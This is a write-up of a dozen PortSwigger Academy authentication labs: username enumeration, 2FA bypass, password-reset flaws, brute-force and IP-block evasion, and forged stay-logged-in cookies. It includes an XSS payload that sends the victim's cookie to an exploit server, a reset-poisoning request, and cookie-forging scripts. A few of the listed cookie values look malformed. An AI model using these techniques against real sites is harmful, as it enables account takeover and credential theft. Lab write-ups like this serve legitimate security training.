01 Username enumeration via different responses
===============================================

This lab is vulnerable to username enumeration and password brute-force attacks.
It has an account with a predictable username and password, which can be found
in the following wordlists:

-   Candidate usernames

-   Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password,
then access their account page.

References:

-   https://portswigger.net/web-security/authentication/password-based

![img](media/2c8b11f925696d5bb3cc748c00cd2de4.png)

I send the POST request from the login to Intruder and set the attack type to
“Pitchfork” (this was a mistake, to test all usernames and passwords it should
be “Cluster bomb”, but it is faster using “Sniper” or “Pitchfork”):

![img](media/496d9fb2ad92ce05a61d49dcb0895372.png)

Then paste the usernames in the set 1 and passwords in set 2:

![img](media/7f8ad47644e1a93a67acea5d288913f6.png)

From the response size we can detect a different response using username
“apollo”:

![img](media/06fa0c6c4538811e10450bad0b5fa994.png)

With a normal attack setting the username to “apollo” and testing the 100
passwords we get the credentials apollo:batman:

![img](media/64e2474dc252cf4296e2dd510b251db9.png)

2FA simple bypass
=================

This lab's two-factor authentication can be bypassed. You have already obtained
a valid username and password, but do not have access to the user's 2FA
verification code. To solve the lab, access Carlos's account page.

-   Your credentials: wiener:peter

-   Victim's credentials carlos:montoya

References:

-   https://portswigger.net/web-security/authentication/multi-factor

![img](media/478299f0fa1e732aad27a308ae3cb664.png)

After authenticating we find there are 2 pages: “/” and “/my-account?id=wiener”:

![img](media/17b5253f99cb245c1af81a3dde0128b2.png)

After logging in as carlos we have to send the security code:

![img](media/8272139a33e859cae9c2503518b9c489.png)

We can access / and then click “Home”:

![img](media/242e515442ee17dcdf4955222c8c5381.png)

03 Password reset broken logic
==============================

This lab's password reset functionality is vulnerable. To solve the lab, reset
Carlos's password then log in and access his "My account" page.

-   Your credentials: wiener:peter

-   Victim's username: carlos

References:

-   https://portswigger.net/web-security/authentication/other-mechanisms

![img](media/826d61849a119bc0e9df1442ff15ff84.png)

There is a “Forgot password” link in the login page:

![img](media/8cb2e2f25056287855d32c7b2abe5e36.png)

We receive a message with a link to restore the password:

![img](media/0f728411ba70517c1e217c259f32bc4f.png)

There we submit the new password:

![img](media/0d9b20792c8f821c656b09743b45aa05.png)

It generates the POST request:

![img](media/3af7211d5c111bd9de2d00580a8f71e7.png)

So we can change the username parameter to “carlos” and access the page with the
new password:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /forgot-password?temp-forgot-password-token=eeiyUnDFWhZqlaBJz707cipGPxh7bN4T HTTP/2
...

temp-forgot-password-token=eeiyUnDFWhZqlaBJz707cipGPxh7bN4T&username=carlos&new-password-1=password&new-password-2=password
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

04 Username enumeration via subtly different responses
======================================================

This lab is subtly vulnerable to username enumeration and password brute-force
attacks. It has an account with a predictable username and password, which can
be found in the following wordlists:

-   Candidate usernames

-   Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password,
then access their account page.

References:

-   https://portswigger.net/web-security/authentication/password-based

![img](media/6324f679c5381a7220a06fe93554e3c5.png)

First a Intruder Sniper attack to enumerate the users:

![img](media/27c8d98dea103d6ea20726f88d0c1e19.png)

For some usernames there is an HTML comment, and then the size of the response
is higher than 3100, while for other users there is not this comment in line 14:

![img](media/53a8168ce9d9a87c22560d77dcc79bcf.png)

![img](media/5540d61ea51ddaf39838a1d659b2cda9.png)

![img](media/eda9c3651af81c49ef41cc251092c424.png)

Adding a new column we find one of the responses does not contain the ending
“.”:

![img](media/a23ff4035a7c0eecf573b0bb794ef3a0.png)

We get the password when we see a redirection, so credentials are
akamai:monitoring:

![img](media/63866b84a033e05f3270abb19cd6fde9.png)

05 Username enumeration via response timing
===========================================

This lab is vulnerable to username enumeration using its response times. To
solve the lab, enumerate a valid username, brute-force this user's password,
then access their account page.

Your credentials: wiener:peter

-   Candidate usernames

-   Candidate passwords

Hint: To add to the challenge, the lab also implements a form of IP-based
brute-force protection. However, this can be easily bypassed by manipulating
HTTP request headers.

References:

-   https://portswigger.net/web-security/authentication/password-based

![img](media/6324f679c5381a7220a06fe93554e3c5.png)

I will set a Pitchfork attack adding the “X-Forwarded-For” header:

![img](media/7b264badc7685e5019e4384c00cd3ba8.png)

I will add numbers to the IP address from that header:

![img](media/ae1522a0ef1bf56b4e3e949b90fdb091.png)

There is a button “Columns” at the top:

![img](media/743fc684801f3530a7ae18a200fc0c37.png)

We can see which requests took longer. For this, it is important to set a very
long password:

![img](media/207ad9238f585b33cec3d2f6498c3a27.png)

There is a redirection so credentials are accounts:jessica:

![img](media/f84a92b7ecc126f2aa9ef54d0a09067c.png)

06 - Broken brute-force protection, IP block
============================================

This lab is vulnerable due to a logic flaw in its password brute-force
protection. To solve the lab, brute-force the victim's password, then log in and
access their account page.

Your credentials: wiener:peter Victim's username: carlos

Hint: Advanced users may want to solve this lab by using a macro or the Turbo
Intruder extension. However, it is possible to solve the lab without using these
advanced features.

References:

-   https://portswigger.net/web-security/authentication/password-based

-   https://portswigger.net/web-security/authentication/auth-lab-passwords

![img](media/a0c8da48aa7de0e4da9b8c8e27ad370d.png)

Generated link:
https://0a9f008704cb076382ef4c7e0060006d.web-security-academy.net/

Trying a bruteforce you get a message the IP is blocked:

![img](media/1a658e6998b6e321b1dd89b62adecafa.png)

Attempt 8 returns incorrect password:

![img](media/dfd84e269d0adfc1b7ff4da3133bce06.png)

To send the correct credentials wiener:peter after every login attempt I created
a list with the password after every of the 100 passwords to test:

![img](media/89937e169dff5e0ddc818b91e7fdffe5.png)

And a list with both usernames:

![img](media/40cbf84066eb4eb54cdb8ac4b1a4a0ea.png)

I wil use the Pitchfork attack type, described here, which will take the values
of each list one by one:

![img](media/6cd10341e524b08d48f49fe6bda0ae5d.png)

Send the payload:

![img](media/a357e41974a7468330c02dc27e0aa02a.png)

Now the attack is executed, but not successfully:

![img](media/2f8ea2891bb38e4db754aef561373fe1.png)

It ends up blocked after 15 passwords, so I will add the correct login after
more passwords than just one.

I created a short Python script to generate the user list:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
all_passw = open("100pass.txt").read().splitlines()

counter = 0
num = 5

print("wiener")
#print("peter")
for i in all_passw:
        counter += 1
        print("carlos")
        #print(i)
        if counter % num == 0:
                print("wiener")
                #print("peter")
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

And the password list:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
all_passw = open("100pass.txt").read().splitlines()

counter = 0
num = 5

#print("wiener")
print("peter")
for i in all_passw:
        counter += 1
        #print("carlos")
        print(i)
        if counter % num == 0:
                #print("wiener")
                print("peter")
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/efc36cb73cc5ab355961e6d00cc08160.png)

But this did not work either.

Finally I added 1000 milliseconds between request in Resource Pool:

![img](media/e62ebebde30bc87b48fd12be92823b16.png)

And now it works. We find the password for carlos is “moon”:

![img](media/e87e3774b437df32d413a8c76c39bad7.png)

07 Username enumeration via account lock
========================================

This lab is vulnerable to username enumeration. It uses account locking, but
this contains a logic flaw. To solve the lab, enumerate a valid username,
brute-force this user's password, then access their account page.

-   Candidate usernames

-   Candidate passwords

References:

-   https://portswigger.net/web-security/authentication/password-based

![img](media/c928093f065456cbd1ecb4a441f35366.png)

Intercept the login POST request and send it to Intruder:

![img](media/0d6c22b09972c085bbf5d8c0555bf15b.png)

The user “pi” was locked:

![img](media/e2ed1556fd48ff43554670dc80d19e61.png)

Then we will set the username and test all passwords:

![img](media/1627197fc4f85c20e22ae1ac660c6d61.png)

One request does not return the message of invalid password or too many
requests, it seems it is blank. This is the correct password:

![img](media/9cfddd1c10854d13ed8456efa6fe4dc6.png)

08 2FA broken logic
===================

This lab's two-factor authentication is vulnerable due to its flawed logic. To
solve the lab, access Carlos's account page.

Your credentials: wiener:peter Victim's username: carlos You also have access to
the email server to receive your 2FA verification code.

Hint: Carlos will not attempt to log in to the website himself.

References:

-   https://portswigger.net/web-security/authentication/multi-factor

![img](media/708fcd907bed8adaeaa5b431fa3ef508.png)

We must use a security code sent to our email:

![img](media/26297b55d6d937501a33ec6fe3355b02.png)

After the first login there is a redirection which creates the cookie with value
“verify=wiener”:

![img](media/d8e6ca8d384fd4d5996c8e9e985c8a88.png)

We can change it to “verify=carlos”:

![img](media/4395a236b944de7bdb6d568e6a2d3adf.png)

When we get to "/login2" the “verify” cookie is for carlos and we do not receive
a MFA code:

![img](media/e7244cf4634863c81c7a9369b2681430.png)

We can send this to Intruder:

![img](media/3d082c55a4c10c60a3f0e216917f3803.png)

And we can bruteforce it with a payload like this one:

![img](media/9669c4c6be4fae3612446ccac17dcf0a.png)

The code “1985” generates a different response:

![img](media/1f78574e9968f46da58cf5c338646d00.png)

And we log in as carlos:

![img](media/4f9438f156329875cff3215f80d6cfba.png)

09 Brute-forcing a stay-logged-in cookie
========================================

This lab allows users to stay logged in even after they close their browser
session. The cookie used to provide this functionality is vulnerable to
brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account"
page.

-   Your credentials: wiener:peter

-   Victim's username: carlos

-   Candidate passwords

References:

-   https://portswigger.net/web-security/authentication/other-mechanisms

![img](media/567e58f1daa454d87476a9d34b9a477f.png)

There is an option to stay logged in:

![img](media/e4576be0a6f8f8bf7fc505ef5a54aeb9.png)

It generates a cookie “stay-logged-in”:

![img](media/52d55fed7b265f92d58dc65e9e18124a.png)

The content of the cookie is the Base64 encode value of
“wiener:51dc30ddc473d43a6011e9ebba6ca770”, and
“51dc30ddc473d43a6011e9ebba6ca770” is the MD5 hash of “peter”. So the formula
for the cookie is BASE64(user:MD5(password)):

![img](media/947bd05077d284e7edbc0acf3e9c7030.png)

With just this cookie it is possible to connect to /my-account:

![img](media/e6fbf0a1c9ddac1048b8e893e061ab02.png)

I will create the possible values with this script:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
import hashlib, base64

pwds = open("pass.txt").read().splitlines()

for i in pwds:
        result = hashlib.md5(i.encode())
        #print(result.hexdigest())
        message = "carlos:"+result.hexdigest()
        #print(message)
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print(base64_message)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/3470338386b3f0b8264e31b54a93fe2b.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl
Y2FybG9zOjVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5
Y2FybG9zOjI1ZDU1YWQyODNhYTQwMGFmNDY0Yzc2ZDcxM2MwN2Fk
Y2FybG9zOmQ4NTc4ZWRmODQ1OGNlMDZmYmM1YmI3NmE1OGM1Y2E0
Y2FybG9zOjI1ZjllNzk0MzIzYjQ1Mzg4NWY1MTgxZjFiNjI0ZDBi
Y2FybG9zOjgyN2NjYjBlZWE4YTcwNmM0YzM0YTE2ODkxZjg0ZTdi
Y2FybG9zOjgxZGM5YmRiNTJkMDRkYzIwMDM2ZGJkODMxM2VkMDU1
Y2FybG9zOjk2ZTc5MjE4OTY1ZWI3MmM5MmE1NDlkZDVhMzMwMTEy
Y2FybG9zOmZjZWE5MjBmNzQxMmI1ZGE3YmUwY2Y0MmI4YzkzNzU5
Y2FybG9zOjg2MjFmZmRiYzU2OTg4MjkzOTdkOTc3NjdhYzEzZGIz
Y2FybG9zOjQyOTdmNDRiMTM5NTUyMzUyNDViMjQ5NzM5OWQ3YTkz
Y2FybG9zOjI3NmY4ZGIwYjg2ZWRhYTdmYzgwNTUxNmM4NTJjODg5
Y2FybG9zOmU5OWExOGM0MjhjYjM4ZDVmMjYwODUzNjc4OTIyZTAz
Y2FybG9zOjM3YjRlMmQ4MjkwMGQ1ZTk0YjhkYTUyNGZiZWIzM2Mw
Y2FybG9zOmQwNzYzZWRhYTlkOWJkMmE5NTE2MjgwZTkwNDRkODg1
Y2FybG9zOjBkMTA3ZDA5ZjViYmU0MGNhZGUzZGU1YzcxZTllOWI3
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
Y2FybG9zOmVExOTE3OTc2MjRkZDNhNDhmYTY4MWQzMDYxMjEy
Y2FybG9zOmYzNzllYWYzYzgzMWIwNGRlMTUzNDY5ZDFiZWMzNDVl
Y2FybG9zOjZlZWE5YjdlZjE5MTc5YTA2OTU0ZWRkMGY2YzA1Y2Vi
Y2FybG9zOmM4ODM3YjIzZmY4YWFhOGEyZGRlOTE1NDczY2UwOTkx
Y2FybG9zOmJlZTc4M2VlMjk3NDU5NTQ4NzM1N2UxOTVlZjM4Y2Ey
Y2FybG9zOmU4MDdmMWZjZjgyZDEzMmY5YmIwMThjYTY3MzhhMTlm
Y2FybG9zOjBhY2Y0NTM5YTE0YjNhYTI3ZGVlYjRjYmRmNmU5ODlm
Y2FybG9zOmMzMzM2NzcwMTUxMWI0ZjYwMjBlYzYxZGVkMzUyMDU5
Y2FybG9zOjg0ZDk2MTU2OGE2NTA3M2EzYmNmMGViMjE2YjJhNTc2
Y2FybG9zOjFjNjMxMjlhZTlkYjljNjBjM2U4YWE5NGQzZTAwNDk1
Y2FybG9zOmRjMGZhN2RmM2QwNzkwNGEwOTI4OGJkMmQyYmI1ZjQw
Y2FybG9zOjkzMjc5ZTMzMDhiZGJiZWVkOTQ2ZmM5NjUwMTdmNjdh
Y2FybG9zOjY3MGIxNDcyOGFkOTkwMmFlY2JhMzJlMjJmYTRmNmJk
Y2FybG9zOjc2NDE5YzU4NzMwZDlmMzVkZTdhYzUzOGMyZmQ2NzM3
Y2FybG9zOjQ2Zjk0YzhkZTE0ZmIzNjY4MDg1MDc2OGZmMWI3ZjJh
Y2FybG9zOmIzNmQzMzE0NTFhNjFlYjJkNzY4NjBlMDBjMzQ3Mzk2
Y2FybG9zOjVmY2ZkNDFlNTQ3YTEyMjE1YjE3M2ZmNDdmZGQzNzM5
Y2FybG9zOmQxNmQzNzdhZjc2Yzk5ZDI3MDkzYWJjMjIyNDRiMzQy
Y2FybG9zOjE2NjBmZTVjODFjNGNlNjRhMjYxMTQ5NGM0MzllMWJh
Y2FybG9zOjAyYzc1ZmIyMmM3NWIyM2RjOTYzYzdlYjkxYTA2MmNj
Y2FybG9zOmExNTJlODQxNzgzOTE0MTQ2ZTRiY2Q0ZjM5MTAwNjg2
Y2FybG9zOjZiMWIzNmNiYjA0YjQxNDkwYmZjMGFiMmJmYTI2Zjg2
Y2FybG9zOmQ5YjIzZWJiZjliNDMxZDAwOWEyMGRmNTJlNTE1ZGI1
Y2FybG9zOmRhNDQzYTBhZDk3OWQ1NTMwZGYzOGNhMWE3NGU0Zjgw
Y2FybG9zOmVmNGNkZDMxMTc3OTNiOWZkNTkzZDc0ODg0MDk2MjZk
Y2FybG9zOmVjMGUyNjAzMTcyYzczYThiNjQ0YmI5NDU2YzFmZjZl
Y2FybG9zOmQ5MTRlM2VjZjZjYzQ4MTExNGEzZjUzNGE1ZmFmOTBi
Y2FybG9zOmY3OGYyNDc3ZTk0OWJlZTJkMTJhMmM1NDBmYjYwODRm
Y2FybG9zOjA1NzE3NDllMmFjMzMwYTc0NTU4MDljNmIwZTdhZjkw
Y2FybG9zOmYyNWEyZmM3MjY5MGI3ODBiMmExNGUxNDBlZjZhOWUw
Y2FybG9zOjA4ZjkwYzFhNDE3MTU1MzYxYTVjNGI4ZDI5N2UwZDc4
Y2FybG9zOmJmNzc5ZTA5MzNhODgyODA4NTg1ZDE5NDU1Y2Q3OTM3
Y2FybG9zOjY4NGM4NTFhZjU5OTY1YjY4MDA4NmI3YjQ4OTZmZjk4
Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx
Y2FybG9zOmRmMDM0OWNlMTEwYjY5ZjAzYjRkZWY4MDEyYWU0OTcw
Y2FybG9zOmFkOTI2OTQ5MjM2MTJkYTA2MDBkN2JlNDk4Y2MyZTA4
Y2FybG9zOmFhNDdmODIxNWM2ZjMwYTBkY2RiMmEzNmE5ZjQxNjhl
Y2FybG9zOjViYWRjYWY3ODlkM2QxZDA5Nzk0ZDhmMDIxZjQwZjBl
Y2FybG9zOmVlODlmN2E3YTA1NjViYTU2ZjhmYjU3OTRjMGJkOWZl
Y2FybG9zOmQwOTcwNzE0NzU3NzgzZTZjZjE3YjI2ZmI4ZTIyOThm
Y2FybG9zOjliMzA2YWIwNGVmNWUyNWY5ZmI4OWM5OThhNmFlZGFi
Y2FybG9zOmRmNTNjYTI2ODI0MGNhNzY2NzBjODU2NmVlNTQ1Njhh
Y2FybG9zOjIzNDVmMTBiYjk0OGM1NjY1ZWY5MWY2NzczYjNlNDU1
Y2FybG9zOmFhZTAzOWQ2YWEyMzljZmMxMjEzNTdhODI1MjEwZmEz
Y2FybG9zOmIzZjk1MmQ1ZDlhZGVhNmY2M2JlZTlkNGM2ZmNlZWFh
Y2FybG9zOmI1OWM2N2JmMTk2YTQ3NTgxOTFlNDJmNzY2NzBjZWJh
Y2FybG9zOmI0MjdlYmQzOWM4NDVlYjU0MTdiN2Y3YWFmMWY5NzI0
Y2FybG9zOjViMWI2OGE5YWJmNGQyY2QxNTVjODFhOTIyNWZkMTU4
Y2FybG9zOjFiYmQ4ODY0NjA4MjcwMTVlNWQ2MDVlZDQ0MjUyMjUx
Y2FybG9zOmUwNDc1NTM4N2U1YjU5NjhlYzIxM2U0MWY3MGMxZDQ2
Y2FybG9zOmQ1YWExNzI5YzhjMjUzZTVkOTE3YTUyNjQ4NTVlYWI4
Y2FybG9zOmY2M2Y0ZmJjOWY4Yzg1ZDQwOWYyZjU5ZjJiOWUxMmQ1
Y2FybG9zOjFhMWRjOTFjOTA3MzI1YzY5MjcxZGRmMGM5NDRiYzcy
Y2FybG9zOjFkM2QzNzY2N2E4ZDdlYjAyMDU0YzZhZmRmOWUyZTFj
Y2FybG9zOjU1ODM0MTM0NDMxNjRiNTY1MDBkZWY5YTUzM2M3Yzcw
Y2FybG9zOjBiNGU3YTBlNWZlODRhZDM1ZmI1Zjk1YjljZWVhYzc5
Y2FybG9zOjZmNGVjNTE0ZWVlODRjYzU4YzhlNjEwYTBjODdkN2Ey
Y2FybG9zOjhhZmE4NDdmNTBhNzE2ZTY0OTMyZDk5NWM4ZTc0MzVh
Y2FybG9zOmQxMTMzMjc1ZWUyMTE4YmU2M2E1NzdhZjc1OWZjMDUy
Y2FybG9zOmZlYTBmMWY2ZmVkZTkwYmQwYTkyNWI0MTk0ZGVhYzEx
Y2FybG9zOjYyMDk4MDQ5NTIyMjVhYjNkMTQzNDgzMDdiNWE0YTI3
Y2FybG9zOjZiMTYyOGIwMTZkZmY0NmU2ZmEzNTY4NGJlNmFjYzk2
Y2FybG9zOmI1YzBiMTg3ZmUzMDlhZjBmNGQzNTk4MmZkOTYxZDdl
Y2FybG9zOmFkZmY0NGM1MTAyZmNhMjc5ZmNlNzU1OWFiZjY2ZmVl
Y2FybG9zOmZjNjNmODdjMDhkNTA1MjY0Y2FiYTM3NTE0Y2QwY2Zk
Y2FybG9zOjkxY2IzMTVhNjQwNWJmY2MzMGUyYzQ1NzFjY2ZiOGNl
Y2FybG9zOjVlZjY0YmFkOGY5ZDdlMGM4NWY4MjE1ODBlNGQ2NjI5
Y2FybG9zOmU2YTViYTA4NDJhNTMxMTYzNDI1ZDY2ODM5NTY5YTY4
Y2FybG9zOjlkZjNiMDFjNjBkZjIwZDEzODQzODQxZmYwZDQ0ODJj
Y2FybG9zOjFkMTBjYTdmOGZlMjYxNWJmNzJhMjQ5YTdkMzRkNmI5
Y2FybG9zOjZlYmU3NmM5ZmI0MTFiZTk3YjNQ0OGI3OTFhN2M5
Y2FybG9zOjA5ZjgzMTZlMjk2NDlhN2Y3OTVmNDE0YmEzODYwZmMw
Y2FybG9zOjIyOTk3OWZjZTUxNzRjMTdkNDY0NWJmODc1MmRhZTFl
Y2FybG9zOjVjNzY4NmMwMjg0ZTA4NzViMjZkZTk5YzEwMDhlOTk4
Y2FybG9zOjdkOGJjNWYxYThkMzc4N2QwNmVmMTFjOTdkNDY1NWRm
Y2FybG9zOjIxYjcyYzBiN2FkYzVjN2I0YTUwZmZjYjkwZDkyZGQ2
Y2FybG9zOmIzZThjZGQ5ZmY0NDI1OWZkNjdlODc5ZTU3OGNkOGY0
Y2FybG9zOmJkMWQ3YjA4MDllNGI0ZWU5Y2EzMDdhYTUzMDhlYTZm
Y2FybG9zOjA4YjU0MTFmODQ4YTI1ODFhNDE2NzJhNzU5Yzg3Mzgw
Y2FybG9zOjg5OTQ4YzdmNDg5MGFmNWZmMTg1MjRiNGZjM2YzNjEx
Y2FybG9zOjY1NzlhOTJlN2Y1YWM3YzU3MDU1MTk2YjNhZmUzZGRk
Y2FybG9zOjZkNGRiNWZmMGMxMTc4NjRhMDI4MjdiYWQzYzM2MWI5
Y2FybG9zOjYzYjA0YTM3MTg0OTY5NGVmMzg2NDY4N2FkY2I0MTBh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We get a different response with
“Y2FybG9zOmIzZThjZGQ5ZmY0NDI1OWZkNjdlODc5ZTU3OGNkOGY0”, which is the payload for
the password “mobilemail”:

![img](media/7a2c8d3c71cf82a3afacc1cdf7e1a315.png)

![img](media/5c13896f9e72228880b91dfa1ac49a97.png)

10 Offline password cracking

This lab stores the user's password hash in a cookie. The lab also contains an
XSS vulnerability in the comment functionality. To solve the lab, obtain
Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as
carlos and delete his account from the "My account" page.

\- Your credentials: wiener:peter

\- Victim's username: carlos

Learning path: If you're following our suggested learning path, please note that
this lab requires some understanding of topics that we haven't covered yet.
Don't worry if you get stuck; try coming back later once you've developed your
knowledge further.

\---------------------------------------------

References:

\- https://portswigger.net/web-security/authentication/other-mechanisms

![](images/Offline%20password%20cracking/1.png)

\---------------------------------------------

First I will create a comment with this payload to send the cookie to the
exploit server:

\`\`\`

\<script\>var i=new
Image;i.src="https://exploit-0a500006035b831a8133a1940130000d.exploit-server.net/log?cookie="+document.cookie;\</script\>

\`\`\`

![](images/Offline%20password%20cracking/2.png)

We get the value from carlos' cookie:

![](images/Offline%20password%20cracking/3.png)

Then I logged in as wiener and got the “stay-logged-in” cookie
“d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw”:

![](images/Offline%20password%20cracking/4.png)

It uses the same password structure as the previous lab,
BASE64(user:MD5(password)):

![](images/Offline%20password%20cracking/5.png)

It seems it is the MD5 hash for “onceuponatime”:

![](images/Offline%20password%20cracking/6.png)

So we can now connect and delete the account:

![](images/Offline%20password%20cracking/7.png)

11 Password reset poisoning via middleware
==========================================

This lab is vulnerable to password reset poisoning. The user carlos will
carelessly click on any links in emails that he receives. To solve the lab, log
in to Carlos's account. You can log in to your own account using the following
credentials: wiener:peter. Any emails sent to this account can be read via the
email client on the exploit server.

References:

-   https://portswigger.net/web-security/authentication/other-mechanisms

![img](media/3d33119fc10183cef02cbbc47a1a3c51.png)

A POST request is generated when trying to change the password:

![img](media/c528acf9b26f7ca47b45de67e0a9184a.png)

The link generated is
“https://0a12001204e7e3e982ef202200a10043.web-security-academy.net/forgot-password?temp-forgot-password-token=JiMwnEiWPtqhfR5EAaUObelEM6CE11uK”:

![img](media/d9025a001490d04c93213f342a02c697.png)

It is possible to poison the URL of the email using the header
“X-Forwarded-Host”:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /forgot-password HTTP/2
...
X-Forwarded-Host: exploit-0a870063038466fd80799d71012c004f.exploit-server.net

username=carlos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/d82e9bb508d0f837cecad97c66d21a71.png)

With this, there is a request to the exploit server:

![img](media/b2c9f5a4d6656284236912df46361266.png)

We can use this to change carlos' password:

![img](media/ea00bc6305a97df55d1713e3e086304b.png)

![img](media/c156e4d4ba229f4a4d2be36e105fe1f5.png)

12 Password brute-force via password change
===========================================

This lab's password change functionality makes it vulnerable to brute-force
attacks. To solve the lab, use the list of candidate passwords to brute-force
Carlos's account and access his "My account" page.

-   Your credentials: wiener:peter

-   Victim's username: carlos

-   Candidate passwords

References:

-   https://portswigger.net/web-security/authentication/other-mechanisms

![img](media/10d1296a3d43470a3deb5b88ea342f83.png)

There is a function to update the password:

![img](media/37087e201ae40e307ca40c32f34935a2.png)

It generates a POST request with the username and current password as
parameters:

![img](media/9b156ede36538f96159145406f5c3426.png)

When the current password is correct but the new passwords are different the
message is:

![img](media/acd6f3c996952440608f21b13851c02e.png)

When the new passwords do not match and the current password is wrong the
message is:

![img](media/3ff7e2496a6d09e6bdbb6b448769a2b4.png)

We can change the username and send it to Intruder to test all the passwords:

![img](media/b8fa0af8cbec1f033a0e1e4a9ba033ba.png)

From this we get that the password is “12345”:

![img](media/7636f4959a8b23f42a40fd97717a6cf4.png)
